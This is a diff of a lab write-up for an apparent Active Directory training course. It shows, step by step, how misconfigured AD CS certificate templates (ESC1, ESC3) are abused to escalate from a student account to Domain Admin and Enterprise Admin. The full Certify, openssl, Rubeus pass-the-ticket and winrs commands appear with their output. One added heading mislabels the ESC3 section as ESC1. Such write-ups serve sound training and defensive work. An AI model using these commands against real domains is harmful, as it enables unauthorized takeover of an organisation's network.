@@ -1,19 +1,36 @@
-# Learning Objective 21
+# Learning Objective 21 (Privilege Escalation | Across Domain Trusts - AD CS + ESC1 + ESC3)
 
 ## Tasks
 
-1. **Check if AD CS is used by the target forest and find any vulnerable/abusable templates**
-2. **Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin**
+1. **Exploit ESC1 vulnerable certificate templates to escalate privileges to DA and EA**
+2. **Exploit ESC3 vulnerable certificate templates to escalate privileges to DA and EA**
+
+---
+
+## Attack Path Steps
+
+- **Find ESC1 Vulnerable Certificate Templates**
+- **Exploit ESC1 Vulnerability to Request a Certificate for a User with DA Privileges**
+- **Use the Obtained Certificate to Request a TGT with DA Privileges**
+- **Exploit ESC1 Vulnerability to Request a Certificate for a User with EA Privileges**
+- **Use the Obtained Certificate to Request a TGT with EA Privileges**
+- **Find ESC3 Vulnerable Certificate Templates**
+- **Exploit ESC3 Vulnerability to Request a Certificate for a User with DA Privileges**
+- **Use the Obtained Certificate to Request a TGT with DA Privileges**
+- **Exploit ESC3 Vulnerability to Request a Certificate for a User with EA Privileges**
+- **Use the Obtained Certificate to Request a TGT with EA Privileges**
 
 ---
 
 ## Solution
 
-1. **Check if AD CS is used by the target forest and find any vulnerable/abusable templates**
+1. **Exploit ESC1 vulnerable certificate templates to escalate privileges to DA and EA**
 
-We can use the Certify tool to check for AD CS in `moneycorp`.
+- **Find ESC1 Vulnerable Certificate Templates**
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+We can use the Certify tool to check for AD CS in `moneycorp` forest.
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Certify.exe cas`:
 ```
@@ -33,7 +50,7 @@ We can use the Certify tool to check for AD CS in `moneycorp`.
 
 [*] Root CAs
 
-    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local🏛️
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA🏛️, DC=moneycorp, DC=local
     Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
     Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
     Cert Start Date               : 11/26/2022 1:59:16 AM
@@ -77,48 +94,19 @@ We can list all the templates using the following command. Going through the out
 
 [SNIP]
 
-CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
-    Template Name                         : SmartCardEnrollment-Agent📜
-    Schema Version                        : 2
-    Validity Period                       : 10 years
-    Renewal Period                        : 6 weeks
-    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
-    mspki-enrollment-flag                 : AUTO_ENROLLMENT
-    Authorized Signatures Required        : 0
-    pkiextendedkeyusage                   : Certificate Request Agent📌
-    mspki-certificate-application-policy  : Certificate Request Agent
-    Permissions
-      Enrollment Permissions
-        Enrollment Rights           : dcorp\Domain Users📌          S-1-5-21-719815819-3726368948-3917688648-513
-                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
-                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
-      Object Control Permissions
-        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
-        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
-                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
-                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
-        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
-                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
-                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
-        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
-                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
-                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
-
-[SNIP]
-
-    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️
     Template Name                         : HTTPSCertificates📜
     Schema Version                        : 2
     Validity Period                       : 10 years
     Renewal Period                        : 6 weeks
-    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT📌
+    msPKI-Certificate-Name-Flag           : ENROLLEE_SUPPLIES_SUBJECT📌
     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
     mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
     Permissions
       Enrollment Permissions
-        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
+        Enrollment Rights📌         : dcorp\RDPUsers👥              S-1-5-21-719815819-3726368948-3917688648-1123
                                       mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                       mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
       Object Control Permissions
@@ -135,19 +123,16 @@ CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP
 
 [SNIP]
 ```
-🚩
 
-2. **Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin**
+- **Exploit ESC1 Vulnerability to Request a Certificate for a User with DA Privileges**
 
-**Privilege Escalation to DA and EA using ESC1**
-
-The template `HTTPSCertificates` looks interesting. Let's get some more information about it as it allows requestor to supply subject name.
+The template `HTTPSCertificates` looks interesting. Let's get some more information about it as **it allows requestor to supply subject name**.
 
 `C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject`:
 ```
 [SNIP]
 
-[*] Action: Find certificate templates
+[*] Action: Find certificate templates📌
 [*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
 
 [SNIP]
@@ -157,14 +142,14 @@ The template `HTTPSCertificates` looks interesting. Let's get some more informat
     Schema Version                        : 2
     Validity Period                       : 10 years
     Renewal Period                        : 6 weeks
-    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT📌
+    msPKI-Certificate-Name-Flag📌         : ENROLLEE_SUPPLIES_SUBJECT📌
     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
     mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
     Permissions
       Enrollment Permissions
-        Enrollment Rights           : dcorp\RDPUsers📌              S-1-5-21-719815819-3726368948-3917688648-1123
+        Enrollment Rights📌         : dcorp\RDPUsers👥              S-1-5-21-719815819-3726368948-3917688648-1123
                                       mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                       mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
       Object Control Permissions
@@ -184,7 +169,7 @@ The template `HTTPSCertificates` looks interesting. Let's get some more informat
 
 Sweet! The `HTTPSCertificates` template grants enrollment rights to "RDPUsers" group and allows requestor to supply Subject Name. Recall that `student422` is a member of "RDPUsers" group. This means that we can request certificate for any user as `student422`.
 
-Let's request a certificate for Domain Admin (`Administrator`).
+Let's request a certificate for DA `Administrator`.
 
 `C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`:
 ```
@@ -196,7 +181,7 @@ Let's request a certificate for Domain Admin (`Administrator`).
 [*] No subject name specified, using current context as subject.
 
 [*] Template                : HTTPSCertificates📜
-[*] Subject                 : CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
+[*] Subject                 : CN=student422👤, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
 [*] AltName                 : administrator🎭
 
 [*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️
@@ -204,7 +189,7 @@ Let's request a certificate for Domain Admin (`Administrator`).
 [*] CA Response             : The certificate had been issued.
 [*] Request ID              : 32
 
-[*] cert.pem         :
+[*] cert.pem                :
 
 -----BEGIN RSA PRIVATE KEY-----
 
@@ -224,9 +209,11 @@ eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...
 [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
-Copy all the text between `-----BEGIN RSA PRIVATE KEY-----` and `-----END CERTIFICATE-----` and save it to `esc1.pem`.
+Copy all the text between "-----BEGIN RSA PRIVATE KEY-----" and "-----END CERTIFICATE-----" and save it to `esc1.pem`.
 
 ![ESC1 Certificate  esc1.pem](./assets/screenshots/learning_objective_21_esc1_certificate.png)
+
+- **Use the Obtained Certificate to Request a TGT with DA Privileges**
 
 We need to convert it to PFX to use it. Use openssl binary on the student VM to do that. I will use "SecretPass@123" as the export password.
 
@@ -278,8 +265,8 @@ Current LogonId is 0:0x38c010
 
 Cached Tickets: (1)
 
-#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
-        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL🏛️
+#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
+        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
         Start Time: 2/17/2025 13:19:23 (local)
@@ -294,10 +281,12 @@ Check if we actually have DA privileges now.
 
 `winrs -r:dcorp-dc cmd /c set username`:
 ```
-USERNAME=Administrator
+USERNAME=Administrator👤
 ```
 
-Awesome! We can use similar method to escalate to Enterprise Admin privileges. Request a certificate for Enterprise Administrator (`Administrator`).
+- **Exploit ESC1 Vulnerability to Request a Certificate for a User with EA Privileges**
+
+We can use similar method to escalate to Enterprise Admin privileges.
 
 `klist purge`:
 ```
@@ -305,6 +294,8 @@ Current LogonId is 0:0x38c010
         Deleting all tickets:
         Ticket(s) purged!
 ```
+
+Request a certificate for EA `Administrator`.
 
 `C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator`:
 ```
@@ -349,6 +340,8 @@ eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...
 Save the certificate to `esc1-EA.pem` and convert it to PFX. I will use "SecretPass@123" as the export password.
 
 ![ESC1 Certificate esc1-EA.pem](./assets/screenshots/learning_objective_21_esc1_ea_certificate.png)
+
+- **Use the Obtained Certificate to Request a TGT with EA Privileges**
 
 `C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx`:
 ```
@@ -397,8 +390,8 @@ Current LogonId is 0:0x38c010
 
 Cached Tickets: (1)
 
-#0>     Client: Administrator🎭 @ MONEYCORP.LOCAL
-        Server: krbtgt📌/moneycorp.local @ MONEYCORP.LOCAL🏛️
+#0>     Client: Administrator🎭 @ MONEYCORP.LOCAL🏛️
+        Server: krbtgt📌/moneycorp.local @ MONEYCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
         Start Time: 2/17/2025 13:30:37 (local)
@@ -413,19 +406,21 @@ Finally, access `mcorp-dc`!
 
 `winrs -r:mcorp-dc cmd /c set username`:
 ```
-USERNAME=Administrator
+USERNAME=Administrator👤
 ```
 🚩
 
-**Privilege Escalation to DA and EA using ESC3**
+2. **Exploit ESC1 vulnerable certificate templates to escalate privileges to DA and EA**
 
-If we list vulnerable templates in `moneycorp`, we get the following result.
+- **Find ESC3 Vulnerable Certificate Templates**
+
+If we list vulnerable templates in `moneycorp` forest, we get the following result.
 
 `C:\AD\Tools\Certify.exe find /vulnerable`:
 ```
 [SNIP]
 
-[*] Action: Find certificate templates
+[*] Action: Find certificate templates📌
 [*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
 
 [SNIP]
@@ -437,14 +432,14 @@ If we list vulnerable templates in `moneycorp`, we get the following result.
     Schema Version                        : 2
     Validity Period                       : 10 years
     Renewal Period                        : 6 weeks
-    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    msPKI-Certificate-Name-Flag           : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
     mspki-enrollment-flag                 : AUTO_ENROLLMENT
     Authorized Signatures Required        : 0
-    pkiextendedkeyusage                   : Certificate Request Agent📌
+    pkiextendedkeyusage📌                 : Certificate Request Agent📌
     mspki-certificate-application-policy  : Certificate Request Agent
     Permissions
       Enrollment Permissions
-        Enrollment Rights           : dcorp\Domain Users📌          S-1-5-21-719815819-3726368948-3917688648-513
+        Enrollment Rights📌         : dcorp\Domain Users👥          S-1-5-21-719815819-3726368948-3917688648-513
                                       mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                       mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
       Object Control Permissions
@@ -462,32 +457,33 @@ If we list vulnerable templates in `moneycorp`, we get the following result.
 [SNIP]
 ```
 
-The `SmartCardEnrollment-Agent` template has EKU for `Certificate Request Agent` and grants enrollment rights to "Domain Users". If we can find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent, we can request certificate on behalf of any user.
+The `SmartCardEnrollment-Agent` template has EKU for `Certificate Request Agent` and grants enrollment rights to "Domain Users".
+
+If we can find another template that has an EKU that allows for domain authentication and has application policy requirement (`Application Policies`) of `Certificate Request Agent`, **we can request certificate on behalf of any user**.
 
 `C:\AD\Tools\Certify.exe find`:
 ```
 [SNIP]
 
-[*] Action: Find certificate templates
+[*] Action: Find certificate templates📌
 [*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
 
 [SNIP]
 
-[*] Available Certificates Templates :
-
     CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
-    Template Name                         : SmartCardEnrollment-Agent📜
+    Template Name                         : SmartCardEnrollment-Users📜
     Schema Version                        : 2
     Validity Period                       : 10 years
     Renewal Period                        : 6 weeks
-    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    msPKI-Certificate-Name-Flag           : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
     mspki-enrollment-flag                 : AUTO_ENROLLMENT
-    Authorized Signatures Required        : 0
-    pkiextendedkeyusage                   : Certificate Request Agent📌
-    mspki-certificate-application-policy  : Certificate Request Agent
+    Authorized Signatures Required        : 1
+    Application Policies📌                : Certificate Request Agent📌
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
     Permissions
       Enrollment Permissions
-        Enrollment Rights           : dcorp\Domain Users📌          S-1-5-21-719815819-3726368948-3917688648-513
+        Enrollment Rights📌         : dcorp\Domain Users👥          S-1-5-21-719815819-3726368948-3917688648-513
                                       mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                       mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
       Object Control Permissions
@@ -505,7 +501,11 @@ The `SmartCardEnrollment-Agent` template has EKU for `Certificate Request Agent`
 [SNIP]
 ```
 
-Sweet! Now, request an Enrollment Agent Certificate from the template `SmartCardEnrollment-Agent`.
+Note that we found a different certificate template named `SmartCardEnrollment-Users`.
+
+- **Exploit ESC3 Vulnerability to Request a Certificate for a User with DA Privileges**
+
+Sweet! Now, request a certificate from the template `SmartCardEnrollment-Agent`.
 
 `C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent`:
 ```
@@ -550,7 +550,7 @@ Like earlier, save the certificate text to `esc3.pem` and convert to PFX. Let's 
 
 ![ESC3 Certificate esc3.pem](./assets/screenshots/learning_objective_21_esc3_certificate.png)
 
-`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx`:
+`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3.pfx`:
 ```
 WARNING: can't open config file: /usr/local/ssl/openssl.cnf
 Enter Export Password:
@@ -558,9 +558,9 @@ Verifying - Enter Export Password:
 unable to write 'random state'
 ```
 
-Now we can use the Enrollment Agent Certificate to request a certificate for DA from the template `SmartCardEnrollment-Users`.
+Now we can use the `SmartCardEnrollment-Agent` certificate to request a certificate for DA from the template `SmartCardEnrollment-Users`.
 
-`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123`:
+`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3.pfx /enrollcertpw:SecretPass@123`:
 ```
 [SNIP]
 
@@ -569,7 +569,7 @@ Now we can use the Enrollment Agent Certificate to request a certificate for DA 
 [*] Current user context    : dcorp\student422
 
 [*] Template                : SmartCardEnrollment-Users📜
-[*] On Behalf Of            : dcorp\administrator🎭
+[*] On Behalf Of            : dcorp🏛️\administrator🎭
 
 [*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️
 
@@ -594,11 +594,15 @@ eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...
 
 
 [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+[SNIP]
 ```
 
 Once again, save the certificate text to `esc3-DA.pem` and convert the PEM to PFX. Still using "SecretPass@123" as the export password.
 
 ![ESC3 Certificate esc3-DA.pem](./assets/screenshots/learning_objective_21_esc3_da_certificate.png)
+
+- **Use the Obtained Certificate to Request a TGT with DA Privileges**
 
 `C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx`:
 ```
@@ -646,7 +650,7 @@ Current LogonId is 0:0x38c010
 
 Cached Tickets: (1)
 
-#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
@@ -662,13 +666,16 @@ Check if we actually have DA privileges now.
 
 `winrs -r:dcorp-dc cmd /c set username`:
 ```
-USERNAME=Administrator
+USERNAME=Administrator👤
 ```
-🚩
 
-To escalate to Enterprise Admin, we just need to make changes to request to the `SmartCardEnrollment-Users` template and Rubeus. Please note that we are using `/onbehalfof: mcorp\administrator` here.
+- **Exploit ESC3 Vulnerability to Request a Certificate for a User with EA Privileges**
 
-`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123`:
+To escalate to Enterprise Admin, we just need to make changes to request to the `SmartCardEnrollment-Users` template and Rubeus.
+
+**Please note that we are using `/onbehalfof: mcorp\administrator` here.**
+
+`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3.pfx /enrollcertpw:SecretPass@123`:
 ```
 [SNIP]
 
@@ -677,7 +684,7 @@ To escalate to Enterprise Admin, we just need to make changes to request to the 
 [*] Current user context    : dcorp\student422
 
 [*] Template                : SmartCardEnrollment-Users📜
-[*] On Behalf Of            : mcorp\administrator🎭
+[*] On Behalf Of            : mcorp🏛️\administrator🎭
 
 [*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️
 
@@ -700,9 +707,13 @@ eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...
 
 
 [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+[SNIP]
 ```
 
 ![ESC3 Certificate esc3-EA.pem](./assets/screenshots/learning_objective_21_esc3_ea_certificate.png)
+
+- **Use the Obtained Certificate to Request a TGT with EA Privileges**
 
 Convert the PEM to `esc3-EA.pfx` using openssl and use the PFX with Rubeus.
 
@@ -713,6 +724,8 @@ Enter Export Password:
 Verifying - Enter Export Password:
 unable to write 'random state'
 ```
+
+**Please note that we are using `/dc:mcorp-dc.moneycorp.local` here.**
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt`:
 ```
@@ -749,8 +762,8 @@ Current LogonId is 0:0x38c010
 
 Cached Tickets: (1)
 
-#0>     Client: administrator🎭 @ MONEYCORP.LOCAL
-        Server: krbtgt📌/moneycorp.local @ MONEYCORP.LOCAL🏛️
+#0>     Client: administrator🎭 @ MONEYCORP.LOCAL🏛️
+        Server: krbtgt📌/moneycorp.local @ MONEYCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
         Start Time: 2/18/2025 0:46:35 (local)
@@ -765,7 +778,7 @@ Finally, access `mcorp-dc`!
 
 `winrs -r:mcorp-dc cmd /c set username`:
 ```
-USERNAME=Administrator
+USERNAME=Administrator👑
 ```
 🚩
 
